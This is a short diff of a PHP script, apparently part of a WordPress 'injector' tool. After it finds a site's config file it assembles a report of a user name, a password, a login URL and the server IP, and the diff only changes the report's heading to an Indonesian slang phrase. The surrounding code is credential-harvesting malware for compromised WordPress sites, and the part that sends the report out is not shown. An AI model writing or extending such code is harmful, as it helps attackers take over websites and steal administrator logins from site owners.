@@ -58,7 +58,7 @@ if ($found_config) {
             $ip   = $_SERVER['SERVER_ADDR'] ?? gethostbyname($domain);
             $date = date('Y-m-d H:i:s');
 
-            $text = "💎 *AMETHYST WP INJECTOR REPORT* 💎\n\n";
+            $text = "💎 *INI YA BRO LOGINAN NYA!* 💎\n\n";
             $text .= "👤 *User:* " . $user . "\n";
             $text .= "🔑 *Pass:* " . $pass . "\n";
             $text .= "🔗 *Login:* " . $login_url . "\n";
